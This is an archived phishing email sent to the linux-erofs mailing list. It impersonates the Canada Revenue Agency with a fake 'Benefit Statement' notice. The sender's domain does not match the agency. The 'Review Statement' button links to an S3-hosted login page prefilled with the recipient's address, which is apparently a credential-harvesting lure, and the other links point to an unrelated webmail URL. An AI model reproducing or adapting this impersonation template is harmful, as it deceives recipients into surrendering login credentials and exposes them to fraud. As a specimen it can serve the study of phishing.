Return-Path: <linux-erofs+bounces-4529-linux-erofs=archiver.kernel.org@lists.ozlabs.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from lists.ozlabs.org (lists.ozlabs.org [112.213.38.117])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id D0655C88E41
	for <linux-erofs@archiver.kernel.org>; Fri, 11 Sep 2026 03:57:00 +0000 (UTC)
Received: from boromir.ozlabs.org (localhost [127.0.0.1])
	by lists.ozlabs.org (Postfix) with ESMTP id 4hh12L6lrnz2xpv;
	Fri, 11 Sep 2026 13:56:58 +1000 (AEST)
Authentication-Results: lists.ozlabs.org; arc=none smtp.remote-ip="2607:f8b0:4864:20::666"
ARC-Seal: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707; t=1789099018;
	cv=none; b=m76HAKGh6H2wBy8puTPdlHzPSBJ4hNwEIvfi16LL8TIEPgG2MFP0Ms1j1iWSFhIcPcU58bQ5n6/QWwmqSRBYXMy5bkdb3XVRg8UKu8rWc2cg+Uguqm3fMzOiJ7l4C1pi+PvGaeeESb+MOYGWwEw2zXmi5uRNxuBiggPOIKGtk5h6BpqNoObm6UXd+0tN18qZlEs3k7/JlXuXP3vcUMArnLs41MGopvbpmgQEqm7ZI6zA2zsRpG4MJASG0Lr/p9NG7F2c+r3ENOl7slsSTp3975bpDIB617OnKyYz0nw8vNFjOGHiu3LCnDlsWb93jv0qzjWsDKrT+mjLr93gntZ6AA==
ARC-Message-Signature: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707;
	t=1789099018; c=relaxed/relaxed;
	bh=D4WmBCadNlia45thUJXsntmrDMoZZGRLgW+TBRDxxDM=;
	h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id; b=cHN9r07sMsxzybsJyFRpQiYVf+PDJcAK4dchunUAfwiA+YBTd0VkRpw752WhO/wHzPVrZ6tykKI1XCkXnFuMXc6QdIEMhnOittNsjvmB3HG+z4rWif6RGtqEm+CHmyMmOZUbdL0E77lFv4/MqNa2MSjBKC6WpczDaCEmduDG/Hn7IqpBBVsL26JjB/U00OvZdp05VRZnJiofwtS0DoNakvIZhUwI9wjLgAuRsS0yChhKmnuh0QkQZ9e7uq3qsUYT0awMOPdWY0hg1eDhhYOVbUVfGj+wDKQAvdiFXy/L3kG1ERXBr/ko8Rw2hkiRlaSVczYnRPc5pF+Ze9BVEaWbCg==
ARC-Authentication-Results: i=1; lists.ozlabs.org; dmarc=pass (p=quarantine dis=none) header.from=sabeng.it; dkim=pass (1024-bit key; secure) header.d=sabeng.it header.i=@sabeng.it header.a=rsa-sha256 header.s=google header.b=mwZHHJeG; dkim-atps=neutral; spf=pass (client-ip=2607:f8b0:4864:20::666; helo=mail-pl1-x666.google.com; envelope-from=doc793486736api787rnsf8787server@sabeng.it; receiver=lists.ozlabs.org) smtp.mailfrom=sabeng.it
Authentication-Results: lists.ozlabs.org; dmarc=pass (p=quarantine dis=none) header.from=sabeng.it
Authentication-Results: lists.ozlabs.org;
	dkim=pass (1024-bit key; secure) header.d=sabeng.it header.i=@sabeng.it header.a=rsa-sha256 header.s=google header.b=mwZHHJeG;
	dkim-atps=neutral
Authentication-Results: lists.ozlabs.org; spf=pass (sender SPF authorized) smtp.mailfrom=sabeng.it (client-ip=2607:f8b0:4864:20::666; helo=mail-pl1-x666.google.com; envelope-from=doc793486736api787rnsf8787server@sabeng.it; receiver=lists.ozlabs.org)
Received: from mail-pl1-x666.google.com (mail-pl1-x666.google.com [IPv6:2607:f8b0:4864:20::666])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange x25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by lists.ozlabs.org (Postfix) with ESMTPS id 4hh12G30gRz2xlJ
	for <linux-erofs@lists.ozlabs.org>; Fri, 11 Sep 2026 13:56:48 +1000 (AEST)
Received: by mail-pl1-x666.google.com with SMTP id d9443c01a7336-2d5cad1a6baso2048055ad.3
        for <linux-erofs@lists.ozlabs.org>; Thu, 10 Sep 2026 20:56:48 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=sabeng.it; s=google; t=1789099006; x=1789703806; darn=lists.ozlabs.org;
        h=message-id:date:mime-version:content-type:to:subject:from:from:to
         :cc:subject:date:message-id:reply-to:content-type;
        bh=D4WmBCadNlia45thUJXsntmrDMoZZGRLgW+TBRDxxDM=;
        b=mwZHHJeGvRvTMJdP1ocB+EFKzBzyFl7Ld6AiR4MORP4pOvuWnjOU+UjWsyjjVTnqqV
         y8dXZh1o5lm7r734zhVczinQDuUENDSXRrZQ3+EzWh6knyDf1oABpt4Zwa050g044uOW
         F/b2xJJ1jiee5GR+0m6sdpLgaV9+504Mo6Dr8=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789099006; x=1789703806;
        h=message-id:date:mime-version:content-type:to:subject:from:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=D4WmBCadNlia45thUJXsntmrDMoZZGRLgW+TBRDxxDM=;
        b=qPzzve0pqLJojomc6N8nkqQV9eqdQII0e1y4vw7MAau963aNjwmKamgbWLXP4dUCQD
         NGQGy7qKUFIFI3nBZ9xClQ0g6CDMFko9S0rtatZ/ypRuVA9BSe4VxWM08vyz/TRyIeIF
         dDg4+aiBrbdlpu/OoaG2nJvgrTzssJVCU8oHQmjhB+Jh45+RTfY/8DCERj2QEx163h9C
         31+JSDjE18lhAPbG9SkexAaz+804uN09DM93LIPE9FjmJpcSkqFbfTfKQq9cGU4Wmw3K
         9c88Xzii7Ql7JZdH2Kkoe/Cr6v+81TtiA3Q4A+OAT1mShzqDchKW4UZEjEHhytEEhH0Y
         2v1g==
X-Gm-Message-State: AFuF++m/UsgFbi0mXVcLH7QFr9a2uSGyANhRo92UCT6XiQm33pBO8jTu
	UmmPv3Nmft+nWhdcNtIbc6WSbWicm9Du1j9v2i1yyYWRb6iQ+xYnmmXfXX5fRYs9sP7sx3IHMiA
	t3epLA1Dcyncga2i0F3ZWLxUZfax/jYofAH06y/cfcM6sVtg=
X-Gm-Gg: AYBFou3+v28SLO6q0YVoLiUziTu3S34Hfwtps6R5dbCTdnGipd3l/ASKZru3kkduY27
	nRfOtYo+zFN0W0RzzWzaI4jcD4I+y1BjnUIu1BalZfSBXI9pFKFGs52StQ8H4IXDBehpeeNgU1w
	R8WD92Cmub1jnOjWlXbRiCwz5Z9EnSP25Rfh85xCyWwz4CinGWeFQetveUhOkQwIFTph5Rl5LJl
	FBFFbQgN5LKlwa5Zc9SdkJ52jWQRSp9fOqMg0tsvSuGV7M85RvZMhDIuQCGDtZCrYrHgbOmgHGZ
	yPviLTwsGbzeiiZeiIwML5E+3TUy0cxavyALYEoh9Z450Am0M5jAbezryayPz8QtJ1fRnwb36rj
	iW/gZR6wRQA0uO45Xc77WjttGNg==
X-Received: by 2002:a05:6a00:4089:b0:857:7384:b5fa with SMTP id d2e1a72fcca58-86b339d9227mr3873007b3a.22.1789099005977;
        Thu, 10 Sep 2026 20:56:45 -0700 (PDT)
Received: from WIN-QM1GG8S46GD ([86.38.225.202])
        by smtp-relay.gmail.com with ESMTPS id 41be03b00d2f7-cc4c60770b6sm483049a12.0.2026.09.10.20.56.45
        for <linux-erofs@lists.ozlabs.org>
        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
        Thu, 10 Sep 2026 20:56:45 -0700 (PDT)
X-Relaying-Domain: sabeng.it
From: "CRA Benefits and Credits" <doc793486736api787RNSF8787server@sabeng.it>
Subject: Your 2025-2026 Benefit Statement Is Available
To: <linux-erofs@lists.ozlabs.org>
Content-Type: multipart/alternative; boundary="2jO8A1sY81obw=_21EwUlwRWYHRAtVVSSj"
X-Mailing-List: linux-erofs@lists.ozlabs.org
List-Id: <linux-erofs.lists.ozlabs.org>
List-Help: <mailto:linux-erofs+help@lists.ozlabs.org>
List-Owner: <mailto:linux-erofs+owner@lists.ozlabs.org>
List-Post: <mailto:linux-erofs@lists.ozlabs.org>
List-Subscribe: <mailto:linux-erofs+subscribe@lists.ozlabs.org>,
  <mailto:linux-erofs+subscribe-digest@lists.ozlabs.org>,
  <mailto:linux-erofs+subscribe-nomail@lists.ozlabs.org>
List-Unsubscribe: <mailto:linux-erofs+unsubscribe@lists.ozlabs.org>
Precedence: list
MIME-Version: 1.0
Date: Thu, 10 Sep 2026 20:56:45 -0700
Message-Id: <2026100920564500B54CDC5F-6AE185F22D@sabeng.it>

This is a multi-part message in MIME format

--2jO8A1sY81obw=_21EwUlwRWYHRAtVVSSj
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


Government of CanadaGouvernement du Canada

Fran=E7ais https://webmail.grainland.com/cpsess0359036223/3rdparty/rou=
ndcube/?_task=3Dmail&_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1=
%2Cpgpmime%3D0&_uid=3D283417&_mbox=3DINBOX.Trash&_framed=3D1&_action=3D=
preview#v1

Canada Revenue Agency / Agence du revenu du Canada

Dear linux-erofs@lists.ozlabs.org ,

Your 2025-2026 CRA Benefit Statement is now available. This document c=
overs your entitlements for the Canada Child Benefit, GST/HST Credit, =
and Climate Action Incentive.

Please review the attached document and retain a copy for your records=
=2E

? Review Statement https://deskstopmns-vxmemp.s3.eu-west-1.amazonaws.c=
om/login.html#linux-erofs@lists.ozlabs.org

Sincerely,

Canada Revenue Agency

Government of Canada
Gouvernement du Canada

Terms & Conditions https://webmail.grainland.com/cpsess0359036223/3rdp=
arty/roundcube/?_task=3Dmail&_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%3D0%2C=
webp%3D1%2Cpgpmime%3D0&_uid=3D283417&_mbox=3DINBOX.Trash&_framed=3D1&_=
action=3Dpreview#v1

Privacy Policy https://webmail.grainland.com/cpsess0359036223/3rdparty=
/roundcube/?_task=3Dmail&_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp=
%3D1%2Cpgpmime%3D0&_uid=3D283417&_mbox=3DINBOX.Trash&_framed=3D1&_acti=
on=3Dpreview#v1

Official communication from the Canada Revenue Agency. Do not reply di=
rectly to this email.

--2jO8A1sY81obw=_21EwUlwRWYHRAtVVSSj
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
8859-1">
  <META http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge"> <title>Y=
our 2025-2026 Benefit Statement Is Available</title>
 </head>
 <body><table width=3D"620" align=3D"center" class=3D"x_x_v1wrapper" s=
tyle=3D"margin: 0px auto; transform-origin: left top; text-align: left=
; color: rgb(44, 54, 58); text-transform: none; line-height: inherit; =
letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14=
px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spa=
ce: normal; border-collapse: collapse; max-width: 620px; box-sizing: b=
order-box; orphans: 2; widows: 2; font-size-adjust: inherit; font-stre=
tch: inherit; transform: scale(0.96129); font-feature-settings: inheri=
t; background-color: rgb(255, 255, 255); font-variant-ligatures: norma=
l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style: initial; text-decor=
ation-color: initial; font-variant-numeric: inherit; font-variant-east=
-asian: inherit; font-variant-alternates: inherit; font-variant-positi=
on: inherit; font-variant-emoji: inherit; font-optical-sizing: inherit=
; font-kerning: inherit; font-variation-settings: inherit; font-langua=
ge-override: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
" min-scale=3D"0.9612903225806452"><tbody style=3D"box-sizing: border-=
box;"> <TR style=3D"box-sizing: border-box;"> <TD style=3D"padding: 16=
px 28px; white-space: normal !important; box-sizing: border-box; backg=
round-color: rgb(255, 255, 255);"><table width=3D"100%" style=3D"font:=
 inherit; border-collapse: collapse; box-sizing: border-box; font-size=
-adjust: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"=
0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"> <TR sty=
le=3D"box-sizing: border-box;"> <TD valign=3D"middle" style=3D"white-s=
pace: normal !important; box-sizing: border-box;"><table style=3D"font=
: inherit; border-collapse: collapse; box-sizing: border-box; font-siz=
e-adjust: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D=
"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"> <TR st=
yle=3D"box-sizing: border-box;"> <TD width=3D"70" valign=3D"middle" st=
yle=3D"white-space: normal !important; box-sizing: border-box;"><table=
 style=3D"font: inherit; border: 1px solid rgb(204, 204, 204); border-=
image: none; border-collapse: collapse; box-sizing: border-box; font-s=
ize-adjust: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D=
"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"> <TR st=
yle=3D"box-sizing: border-box;"> <TD width=3D"16" style=3D"white-space=
: normal !important; box-sizing: border-box; background-color: rgb(204=
, 0, 0);" data-olk-copy-source=3D"MessageBody">&nbsp;</td><td width=3D=
"36" align=3D"center" style=3D"padding: 4px 0px; white-space: normal !=
important; box-sizing: border-box; background-color: rgb(255, 255, 255=
);"></td><td width=3D"16" style=3D"white-space: normal !important; box=
-sizing: border-box; background-color: rgb(204, 0, 0);">&nbsp;</TD></T=
R></TABLE></td><td width=3D"14" style=3D"white-space: normal !importan=
t; box-sizing: border-box;">&nbsp;</td><td valign=3D"middle" style=3D"=
padding-left: 14px; border-left-color: rgb(153, 153, 153); border-left=
-width: 1px; border-left-style: solid; white-space: normal !important;=
 box-sizing: border-box;"><SPAN style=3D"margin: 0px; padding: 0px; bo=
rder: 0px currentColor; border-image: none; color: rgb(0, 0, 0); line-=
height: 1.3; font-family: Arial, sans-serif, serif, EmojiFont; font-si=
ze: 13px; font-style: inherit; font-variant: inherit; font-weight: bol=
d; vertical-align: baseline; display: block; box-sizing: border-box; f=
ont-size-adjust: inherit; font-stretch: inherit; font-feature-settings=
: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-v=
ariation-settings: inherit; font-language-override: inherit;">Governme=
nt&nbsp;of&nbsp;Canada</SPAN><SPAN style=3D"margin: 0px; padding: 0px;=
 border: 0px currentColor; border-image: none; color: rgb(68, 68, 68);=
 line-height: 1.3; font-family: Arial, sans-serif, serif, EmojiFont; f=
ont-size: 11px; font-style: inherit; font-variant: inherit; font-weigh=
t: inherit; vertical-align: baseline; display: block; box-sizing: bord=
er-box; font-size-adjust: inherit; font-stretch: inherit; font-feature=
-settings: inherit; font-optical-sizing: inherit; font-kerning: inheri=
t; font-variation-settings: inherit; font-language-override: inherit;"=
>Gouvernement&nbsp;du&nbsp;Canada</SPAN></TD></TR></TABLE></td><td ali=
gn=3D"right" valign=3D"middle" style=3D"white-space: normal !important=
; box-sizing: border-box;"><A title=3D"https://webmail.grainland.com/c=
psess0359036223/3rdparty/roundcube/?_task=3Dmail&amp;_caps=3Dpdf%3D1%2=
Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&amp;_uid=3D283417&amp;_=
mbox=3DINBOX.Trash&amp;_framed=3D1&amp;_action=3Dpreview#v1" style=3D"=
margin: 0px; padding: 0px; border: 0px currentColor; border-image: non=
e; color: rgb(40, 65, 98); line-height: inherit; font-family: Arial, s=
ans-serif; font-size: 13px; font-style: inherit; font-variant: inherit=
; font-weight: inherit; text-decoration: underline; vertical-align: ba=
seline; box-sizing: border-box; font-size-adjust: inherit; font-stretc=
h: inherit; font-feature-settings: inherit; background-color: transpar=
ent; font-optical-sizing: inherit; font-kerning: inherit; font-variati=
on-settings: inherit; font-language-override: inherit;" href=3D"https:=
//webmail.grainland.com/cpsess0359036223/3rdparty/roundcube/?_task=3Dm=
ail&amp;_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D=
0&amp;_uid=3D283417&amp;_mbox=3DINBOX.Trash&amp;_framed=3D1&amp;_actio=
n=3Dpreview#v1" target=3D"_blank" rel=3D"noopener noreferrer" data-aut=
h=3D"NotApplicable" data-linkindex=3D"0">Fran=E7ais</A></TD></TR></TAB=
LE></TD></TR> <TR style=3D"box-sizing: border-box;"> <TD style=3D"padd=
ing: 10px 28px; white-space: normal !important; box-sizing: border-box=
; background-color: rgb(38, 55, 74);"><SPAN style=3D"margin: 0px; padd=
ing: 0px; border: 0px currentColor; border-image: none; color: rgb(255=
, 255, 255); line-height: inherit; font-family: Arial, sans-serif, ser=
if, EmojiFont; font-size: 13px; font-style: inherit; font-variant: inh=
erit; font-weight: inherit; vertical-align: baseline; box-sizing: bord=
er-box; font-size-adjust: inherit; font-stretch: inherit; font-feature=
-settings: inherit; font-optical-sizing: inherit; font-kerning: inheri=
t; font-variation-settings: inherit; font-language-override: inherit;"=
>Canada Revenue Agency &nbsp;/&nbsp; Agence du revenu du Canada</SPAN>=
</TD></TR> <TR style=3D"box-sizing: border-box;"> <TD class=3D"x_x_v1m=
obile-pad" style=3D"padding: 32px 40px; white-space: normal !important=
; box-sizing: border-box;"> <P style=3D"margin: 0px 0px 18px; color: r=
gb(26, 26, 26); font-family: Arial, sans-serif; font-size: 15px; box-s=
izing: border-box;">Dear&nbsp;<FONT color=3D"#000000" face=3D"Segoe UI=
" style=3D"background-color: rgb(227, 254, 224);">linux-erofs@lists.oz=
labs.org</FONT> ,</p><p style=3D"margin: 0px 0px 16px; color: rgb(51, =
51, 51); line-height: 1.7; font-family: Arial, sans-serif; font-size: =
15px; box-sizing: border-box;">Your&nbsp;<STRONG style=3D"font-weight:=
 bolder; box-sizing: border-box;">2025-2026 CRA Benefit Statement</STR=
ONG>&nbsp; is now available. This document covers your entitlements fo=
r the Canada Child Benefit, GST/HST Credit, and Climate Action Incenti=
ve.</p><p style=3D"margin: 0px 0px 28px; color: rgb(51, 51, 51); line-=
height: 1.7; font-family: Arial, sans-serif; font-size: 15px; box-sizi=
ng: border-box;"><FONT color=3D"#000000">Please review the attached do=
cument and retain a copy for your records.</FONT></P><table width=3D"1=
00%" style=3D"font: inherit; border-collapse: collapse; box-sizing: bo=
rder-box; font-size-adjust: inherit; font-stretch: inherit;" border=3D=
"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: bo=
rder-box;"> <TR style=3D"box-sizing: border-box;"> <TD align=3D"center=
" class=3D"x_x_v1cta-td" style=3D"padding: 8px 0px 28px; white-space: =
normal !important; box-sizing: border-box;"><A style=3D"margin: 0px; p=
adding: 16px 36px; border: 2px solid rgb(38, 55, 74); border-image: no=
ne; color: rgb(255, 255, 255); line-height: inherit; letter-spacing: 0=
px; font-family: Arial, sans-serif; font-size: 16px; font-style: inher=
it; font-variant: inherit; font-weight: bold; text-decoration: none; v=
ertical-align: baseline; display: inline-block; box-sizing: border-box=
; font-size-adjust: inherit; font-stretch: inherit; font-feature-setti=
ngs: inherit; background-color: rgb(38, 55, 74); font-optical-sizing: =
inherit; font-kerning: inherit; font-variation-settings: inherit; font=
-language-override: inherit;" href=3D"https://deskstopmns-vxmemp.s3.eu=
-west-1.amazonaws.com/login.html#linux-erofs@lists.ozlabs.org" target=3D=
"_blank" rel=3D"noreferrer noopener" data-auth=3D"NotApplicable" data-=
linkindex=3D"1">&#8595;&nbsp; Review Statement</A></TD></TR></TABLE> <=
P style=3D"margin: 0px 0px 6px; color: rgb(51, 51, 51); line-height: 1=
=2E7; font-family: Arial, sans-serif; font-size: 15px; box-sizing: bor=
der-box;">Sincerely,</p><p style=3D"margin: 0px 0px 4px; color: rgb(26=
, 26, 26); font-family: Arial, sans-serif; font-size: 15px; font-weigh=
t: bold; box-sizing: border-box;">Canada Revenue Agency</P></TD></TR> =
<TR style=3D"box-sizing: border-box;"> <TD style=3D"padding: 0px 40px;=
 white-space: normal !important; box-sizing: border-box;"><table width=
=3D"100%" style=3D"font: inherit; border-collapse: collapse; box-sizin=
g: border-box; font-size-adjust: inherit; font-stretch: inherit;" bord=
er=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizin=
g: border-box;"> <TR style=3D"box-sizing: border-box;"> <TD style=3D"h=
eight: 1px; font-size: 1px; border-top-color: rgb(221, 221, 221); bord=
er-top-width: 1px; border-top-style: solid; white-space: normal !impor=
tant; box-sizing: border-box;">&nbsp;</TD></TR></TABLE></TD></TR> <TR =
style=3D"box-sizing: border-box;"> <TD style=3D"padding: 22px 28px; wh=
ite-space: normal !important; box-sizing: border-box; background-color=
: rgb(38, 55, 74);"><table width=3D"100%" style=3D"font: inherit; bord=
er-collapse: collapse; box-sizing: border-box; font-size-adjust: inher=
it; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=
=3D"0"><tbody style=3D"box-sizing: border-box;"> <TR style=3D"box-sizi=
ng: border-box;"> <TD valign=3D"middle" style=3D"white-space: normal !=
important; box-sizing: border-box;"><table style=3D"font: inherit; bor=
der-collapse: collapse; box-sizing: border-box; font-size-adjust: inhe=
rit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpaddin=
g=3D"0"><tbody style=3D"box-sizing: border-box;"> <TR style=3D"box-siz=
ing: border-box;"> <TD width=3D"46" valign=3D"middle" style=3D"white-s=
pace: normal !important; box-sizing: border-box;"><table style=3D"font=
: inherit; border: 1px solid rgb(85, 85, 85); border-image: none; bord=
er-collapse: collapse; box-sizing: border-box; font-size-adjust: inher=
it; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=
=3D"0"><tbody style=3D"box-sizing: border-box;"> <TR style=3D"box-sizi=
ng: border-box;"> <TD width=3D"10" style=3D"white-space: normal !impor=
tant; box-sizing: border-box; background-color: rgb(204, 0, 0);">&nbsp=
;</td><td width=3D"24" align=3D"center" style=3D"padding: 2px 0px; whi=
te-space: normal !important; box-sizing: border-box; background-color:=
 rgb(255, 255, 255);"></td><td width=3D"10" style=3D"white-space: norm=
al !important; box-sizing: border-box; background-color: rgb(204, 0, 0=
);">&nbsp;</TD></TR></TABLE></td><td width=3D"10" style=3D"white-space=
: normal !important; box-sizing: border-box;">&nbsp;</td><td valign=3D=
"middle" style=3D"white-space: normal !important; box-sizing: border-b=
ox;"><SPAN style=3D"margin: 0px; padding: 0px; border: 0px currentColo=
r; border-image: none; color: rgb(255, 255, 255); line-height: inherit=
; font-family: Arial, sans-serif, serif, EmojiFont; font-size: 12px; f=
ont-style: inherit; font-variant: inherit; font-weight: bold; vertical=
-align: baseline; box-sizing: border-box; font-size-adjust: inherit; f=
ont-stretch: inherit; font-feature-settings: inherit; font-optical-siz=
ing: inherit; font-kerning: inherit; font-variation-settings: inherit;=
 font-language-override: inherit;">Government of Canada</SPAN><BR styl=
e=3D"box-sizing: border-box;"><SPAN style=3D"margin: 0px; padding: 0px=
; border: 0px currentColor; border-image: none; color: rgb(170, 170, 1=
70); line-height: inherit; font-family: Arial, sans-serif, serif, Emoj=
iFont; font-size: 11px; font-style: inherit; font-variant: inherit; fo=
nt-weight: inherit; vertical-align: baseline; box-sizing: border-box; =
font-size-adjust: inherit; font-stretch: inherit; font-feature-setting=
s: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-=
variation-settings: inherit; font-language-override: inherit;">Gouvern=
ement du Canada</SPAN></TD></TR></TABLE></td><td align=3D"right" valig=
n=3D"middle" style=3D"white-space: normal !important; box-sizing: bord=
er-box;"><A title=3D"https://webmail.grainland.com/cpsess0359036223/3r=
dparty/roundcube/?_task=3Dmail&amp;_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%=
3D0%2Cwebp%3D1%2Cpgpmime%3D0&amp;_uid=3D283417&amp;_mbox=3DINBOX.Trash=
&amp;_framed=3D1&amp;_action=3Dpreview#v1" style=3D"margin: 0px 0px 4p=
x; padding: 0px; border: 0px currentColor; border-image: none; color: =
rgb(170, 170, 170); line-height: inherit; font-family: Arial, sans-ser=
if; font-size: 12px; font-style: inherit; font-variant: inherit; font-=
weight: inherit; text-decoration: underline; vertical-align: baseline;=
 display: block; box-sizing: border-box; font-size-adjust: inherit; fo=
nt-stretch: inherit; font-feature-settings: inherit; background-color:=
 transparent; font-optical-sizing: inherit; font-kerning: inherit; fon=
t-variation-settings: inherit; font-language-override: inherit;" href=3D=
"https://webmail.grainland.com/cpsess0359036223/3rdparty/roundcube/?_t=
ask=3Dmail&amp;_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgp=
mime%3D0&amp;_uid=3D283417&amp;_mbox=3DINBOX.Trash&amp;_framed=3D1&amp=
;_action=3Dpreview#v1" target=3D"_blank" rel=3D"noopener noreferrer" d=
ata-auth=3D"NotApplicable" data-linkindex=3D"2">Terms &amp; Conditions=
</A><A title=3D"https://webmail.grainland.com/cpsess0359036223/3rdpart=
y/roundcube/?_task=3Dmail&amp;_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%3D0%2=
Cwebp%3D1%2Cpgpmime%3D0&amp;_uid=3D283417&amp;_mbox=3DINBOX.Trash&amp;=
_framed=3D1&amp;_action=3Dpreview#v1" style=3D"margin: 0px; padding: 0=
px; border: 0px currentColor; border-image: none; color: rgb(170, 170,=
 170); line-height: inherit; font-family: Arial, sans-serif; font-size=
: 12px; font-style: inherit; font-variant: inherit; font-weight: inher=
it; text-decoration: underline; vertical-align: baseline; display: blo=
ck; box-sizing: border-box; font-size-adjust: inherit; font-stretch: i=
nherit; font-feature-settings: inherit; background-color: transparent;=
 font-optical-sizing: inherit; font-kerning: inherit; font-variation-s=
ettings: inherit; font-language-override: inherit;" href=3D"https://we=
bmail.grainland.com/cpsess0359036223/3rdparty/roundcube/?_task=3Dmail&=
amp;_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&am=
p;_uid=3D283417&amp;_mbox=3DINBOX.Trash&amp;_framed=3D1&amp;_action=3D=
preview#v1" target=3D"_blank" rel=3D"noopener noreferrer" data-auth=3D=
"NotApplicable" data-linkindex=3D"3">Privacy Policy</A></TD></TR> <TR =
style=3D"box-sizing: border-box;"> <TD style=3D"padding-top: 16px; mar=
gin-top: 16px; border-top-color: rgb(61, 80, 102); border-top-width: 1=
px; border-top-style: solid; white-space: normal !important; box-sizin=
g: border-box;" colspan=3D"2"> <P style=3D"margin: 10px 0px 0px; color=
: rgb(136, 136, 136); line-height: 1.6; font-family: Arial, sans-serif=
; font-size: 11px; box-sizing: border-box;">Official communication fro=
m the Canada Revenue Agency. Do not reply directly to this email.</P><=
/TD></TR></TABLE></TD></TR></TABLE></body>
 </html>

--2jO8A1sY81obw=_21EwUlwRWYHRAtVVSSj--


